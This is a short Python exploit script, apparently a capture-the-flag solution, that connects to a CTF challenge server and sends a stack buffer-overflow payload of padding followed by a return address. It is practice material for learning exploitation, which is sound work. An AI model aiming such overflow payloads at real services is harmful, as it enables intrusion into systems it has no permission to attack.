import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('nc.ctf.unitedctf.ca', 4000))

data = s.recv(1024)
data = repr(data)
print(data)
data = s.recv(1024)
data = repr(data)
print(data)

resp = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x18\x0b@\x00\x00"
print(resp.decode("utf-8"))
s.sendall(resp)

print("--------------------------------")
data = s.recv(1024)
data = repr(data)
print("recieved : " + data)